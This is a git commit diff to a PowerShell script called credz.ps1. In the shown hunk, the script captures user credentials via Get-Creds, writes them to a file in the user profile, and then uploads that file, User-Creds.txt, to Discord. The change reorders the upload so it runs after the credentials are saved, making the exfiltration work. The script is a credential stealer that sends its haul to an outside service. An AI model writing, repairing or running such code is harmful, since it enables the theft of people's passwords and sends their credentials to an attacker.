5508fde08b907143c3b96b1e89690c59a5dd261a
skekic16 <151707511+skekic16@users.noreply.github.com>
2023-12-14 03:00:06 -0600

    Update credz.ps1

--- credz.ps1
+++ credz.ps1
@@ -92,8 +92,12 @@ Add-Type -AssemblyName System.Windows.Forms
 $creds = Get-Creds
 
 #------------------------------------------------------------------------------------------------------------------------------------
-Upload-Discord -file "User-Creds.txt"
+
 echo $creds >> $env:USERPROFILE\$FileName
+
+Upload-Discord -file "User-Creds.txt"
+
+
 
 
 
